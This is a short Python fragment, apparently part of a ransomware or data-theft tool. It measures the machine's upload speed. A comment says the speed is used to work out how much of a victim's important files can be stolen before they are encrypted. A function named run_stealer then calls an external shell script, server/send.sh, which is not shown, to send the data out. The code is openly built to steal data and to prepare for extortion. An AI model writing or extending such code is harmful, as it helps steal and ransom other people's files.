import subprocess
import speedtest

s = speedtest.Speedtest()

s.get_best_server()

UPLOAD = s.upload()

print(f"{UPLOAD / 1_000_000:.2f} Mbit/s")
# to define how much data (importent files) to steal in x (time) before encrypt



def run_stealer():
    result = subprocess.run(
        ["bash", "server/send.sh"],
        check=True, 
    )